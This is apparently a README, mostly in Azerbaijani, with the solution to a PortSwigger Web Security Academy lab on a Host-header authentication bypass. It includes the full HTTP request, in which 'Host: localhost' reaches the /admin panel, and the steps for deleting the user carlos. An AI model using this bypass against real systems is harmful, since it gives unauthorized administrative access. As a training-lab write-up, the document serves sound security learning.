# PortSwigger Web Security Academy - SSRF Labs

Bu repozitoriyada PortSwigger Web Security Academy platformasındakı SSRF (Server-Side Request Forgery) və Host Header Injection lab-larının həlləri yer alır.

---

## Lab: Basic SSRF via HTTP Host Header

### Lab Məqsədi
HTTP `Host` header zəifliyindən istifadə edərək gizli admin panelinə giriş əldə etmək və `carlos` istifadəçisini silməklə lab-ı tamamlamaq.

### Həll Addımları
1. Veb tətbiqdən gələn əsas sorğu Burp Suite Repeater alətinə ötürüldü.
2. `Host` başlığı daxili sistemi simulyasiya etmək üçün `localhost` olaraq dəyişdirildi (`Host: localhost`).
3. Yol hissəsi `/admin` olaraq təyin edilərək daxili idarəetmə panelinə `200 OK` cavabı ilə giriş əldə edildi.
4. `carlos` istifadəçisi silinərək lab uğurla tamamlandı ("Congratulations, you solved the lab!").

---

### HTTP Sorğusu (Request)
Lab zamanı istifadə olunan HTTP/2 sorğu strukturu:

```http
GET /admin HTTP/2,
Host: localhost
Cookie: session=l4HEsoa1m2l5boLI3Ki7hbgp5uBJDORZ; _lab=46%7cMCwCFA0tXrknrbRjnnjNdpkHNx3MjjlQAhQVMWS0nfTVC06SvBVB99eJ6lG7EQjBZeHujqPrsGQSvlx4fukpgVzjbV3dwt023VA9Z%2be6XK4nkaKVX%2bH4Ohz%2fbqhpcakFKnm4gWwxSOpz4%2b8kZlJ3F0XitkTkqHd%2bcn%2f%2b6t4yKxL93uY%3d
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i 

```
#### Alinan cavab
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 6066


BURADA 200 OK ALDIGIMIZ GORUNUR ,BU O DEMEKDIRKI ADMIN KIMI DAXIL OLMUSUQ VE RENDERDE BIZE ADMIN SEHIFESI ACILIB ORADAN DELETE CARLOS LINKINE BASARAQ CARLOSU SILIRIK VE NETICEDE TEBRIKLER LABI KECIDNIZ CAVABINI 2 CI DEFE SORGUNU ATANDA GORURUK 
<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Host header authentication bypass</title>
    </head> 

